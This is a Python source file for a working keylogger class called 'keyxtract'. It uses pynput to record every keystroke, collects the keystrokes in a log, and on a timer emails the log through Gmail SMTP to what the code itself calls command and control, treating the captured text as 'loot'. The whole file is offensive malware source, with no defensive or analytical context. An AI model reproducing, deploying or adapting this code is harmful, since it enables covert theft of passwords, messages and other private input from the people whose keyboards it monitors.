import smtplib
import threading
from pynput.keyboard import Listener

class keyxtract:
# Initializing the instance variables
    def __init__(self, email, password, time_interval):
        self.email = email
        self.password = password
        self.time_interval = time_interval
        self.log = ">>> Listener has been triggered..."

# Captures each and every single key strokes and stores into a variable
    def process_on_keypress(self, key):
        stroke = str(key)
        stroke = stroke.replace("'", "")

        if stroke == 'Key.space':
            stroke = ' '
        elif stroke == 'Key.tab':
            stroke = '  '
        elif stroke == 'Key.enter':
            stroke = '\n'
        elif stroke == 'Key.shift_r':
            stroke = ''
        elif stroke == 'Key.shift':
            stroke = ''
        elif stroke == 'Key.ctrl':
            stroke = ''
        elif stroke == 'Key.backspace':
            stroke = ''
        self.write_to_log(stroke)

# Appending the captured data to log
    def write_to_log(self, string):
        self.log = self.log + string

# Starting the secure handshake with the smtp server
    def smtp_transmit(self, email, password, loot):
        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.starttls()
            smtp.login(email, password)
            smtp.sendmail(email, email, loot)

 # Send the log report to command and control
    def report_to_CnC(self):
        send_data = self.smtp_transmit(self.email, self.password, '\n\n'+ self.log)
        self.log = ''
        timer = threading.Timer(self.time_interval, self.report_to_CnC)
        timer.start()

# Provoking the core Listener
    def initiate_the_listener(self):
         with Listener(on_press=self.process_on_keypress) as l:
            self.report_to_CnC()
            l.join()



